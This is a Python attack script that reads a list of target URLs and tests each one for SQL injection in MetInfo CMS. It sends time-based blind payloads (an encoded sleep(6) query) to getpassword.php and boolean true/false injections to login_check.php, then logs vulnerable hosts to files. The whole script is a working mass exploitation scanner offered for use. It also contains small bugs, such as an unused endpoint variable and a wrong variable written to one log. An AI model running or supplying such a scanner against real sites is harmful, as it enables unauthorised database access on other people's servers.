import sys
import json
import requests
import warnings
import time



urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    #时间盲注漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payloads = [r"/member/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x",
                r"/admin/admin/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x"]

    for payload in payloads:
        vulnurl = url + payload
        start_time = time.time()

        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                print("[+]存在metinfo SQL盲注漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('时间盲注漏洞.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
            else:
                print("[-]不存在metinfo_getpassword_sqli漏洞", "white", "on_grey")

        except:
            print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
        #注入漏洞
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }

        true_url = url + r"/admin/login/login_check.php?langset=cn%27AnD%271%27=%271"
        false_url = url + r"/admin/login/login_check.php?langset=cn%27AnD%271%27=%272"
        try:
            req1 = requests.get(true_url, headers=headers, timeout=10, verify=False)
            req2 = requests.get(false_url, headers=headers, timeout=10, verify=False)
            if r"not have this language" in req2.text and r"not have this language" not in req1.text:
                print("[+]存在metinfo v5.3 SQL注入漏洞...(高危)\tpayload: " + false_url, "red")
                with open('SQL注入.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
            else:
                print("[-]不存在metinfo_login_check_sqli漏洞", "white", "on_grey")

        except:
            print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

